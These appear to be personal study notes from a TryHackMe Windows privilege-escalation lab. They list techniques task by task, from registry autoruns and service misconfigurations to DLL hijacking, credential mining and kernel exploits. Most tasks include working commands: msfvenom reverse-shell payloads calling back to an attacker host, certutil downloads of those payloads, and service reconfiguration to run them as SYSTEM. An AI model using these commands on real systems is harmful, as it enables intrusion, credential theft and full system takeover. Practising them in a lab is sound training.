# TryHackMe – Windows PrivEsc Arena: Technique Notes

General workflow: get a low-priv foothold → enumerate with `accesschk64.exe`, Autoruns, `whoami /priv`, `net user` → identify the misconfiguration → escalate to SYSTEM/Admin.

## Task 3 – Registry Escalation: Autorun
- Use Autoruns / `accesschk64.exe` to find autorun registry entries pointing to a file path your user can write to.
- Generate payload:
  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe
  ```
- Host it (`python3 -m http.server`) and pull it to target:
  ```
  certutil.exe -urlcache -f http://<attacker_ip>:8000/shell.exe shell.exe
  ```
- Replace the autorun binary with your payload if write access allows it.

## Task 4 – Registry Escalation: AlwaysInstallElevated
- Check both registry keys are set to `1`:
  - `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
  - `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- Build a malicious MSI:
  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o setup.msi
  ```
- Download and run — installs as SYSTEM:
  ```
  certutil.exe -urlcache -f http://<attacker_ip>:8000/setup.msi setup.msi
  msiexec /quiet /qn /i setup.msi
  ```

## Task 5 – Service Escalation: Registry
- Find a service whose registry key is writable by your user (`accesschk64.exe -kvuqsw hklm\system\currentcontrolset\services`).
- Point ImagePath at your payload:
  ```
  reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\temp\shell.exe /f
  net start <svc>
  ```

## Task 6 – Service Escalation: Executable Files
- Find a service binary (the actual .exe, not the registry key) that your user can overwrite.
- Replace it with your payload, then restart the service:
  ```
  net stop <svc>
  copy /y shell.exe "C:\path\to\service.exe"
  net start <svc>
  ```

## Task 7 – Privilege Escalation: Startup Applications
- Check ACLs on the global Startup folder:
  `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
- If writable by your user, drop a payload there — it runs when any user (including an admin) logs on via RDP/console.

## Task 8 – Service Escalation: DLL Hijacking
- Use Process Monitor (filter on `NAME NOT FOUND` for the service process) to find a DLL the service tries to load from a path you can write to.
- Build a malicious DLL:
  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o hijackme.dll
  ```
- Download it into the missing-DLL path, then restart the service:
  ```
  certutil.exe -urlcache -f http://<attacker_ip>:8000/hijackme.dll hijackme.dll
  net stop dllsvc & net start dllsvc
  ```

## Task 9 – Service Escalation: binPath
- Use `accesschk64.exe -uwcqv <user> <service>` to find a service you can directly reconfigure via `sc config` (weak service permissions, not just registry).
- Change its binary path and start it:
  ```
  sc config <svc> binpath= "C:\temp\shell.exe"
  net start <svc>
  ```

## Task 10 – Service Escalation: Unquoted Service Paths
- Look for a service path with spaces and no surrounding quotes, e.g.:
  `C:\Program Files\Unquoted Path Service\common files\service.exe`
- Windows will try each space-delimited segment as an executable in order. Drop your payload at an earlier segment, e.g.:
  `C:\Program Files\Unquoted Path Service\common.exe`
- Restart the service:
  ```
  sc start unquotedsvc
  ```

## Task 11 – Potato Escalation: Hot Potato
- NTLM relay / token impersonation technique.
- Tricks Windows automatic update / NBNS mechanisms into authenticating to a local rogue server you control, letting you relay that authentication to escalate to SYSTEM.
- Typically run via a pre-built exploit tool (e.g. Tater/Potato variants) from a PowerShell session (`powershell -ep bypass`).

## Task 12 – Password Mining: Configuration Files
- Check `C:\Windows\Panther\Unattend.xml` (and similar deployment/answer files) for leftover credentials.
- Passwords are often Base64-encoded — decode with:
  ```
  echo <base64string> | base64 -d
  ```
- Example answer from the room: `password123`

## Task 13 – Password Mining: Memory
- Trigger an application (e.g. Internet Explorer) to authenticate over HTTP Basic Auth to a Metasploit auxiliary listener (`auxiliary/server/capture/http_basic`) to capture creds in transit.
- Alternatively, dump a process's memory (e.g. via Task Manager → Create Dump File) and search the dump for cleartext passwords/strings.

## Task 14 – Privilege Escalation: Kernel Exploits
- From a low-priv Meterpreter session, run:
  ```
  use post/multi/recon/local_exploit_suggester
  set SESSION <id>
  run
  ```
- Pick a matching unpatched kernel exploit (e.g. `MS16-014`) and run it to escalate to SYSTEM.

---
*Notes condensed from a public TryHackMe walkthrough for personal reference/study.*
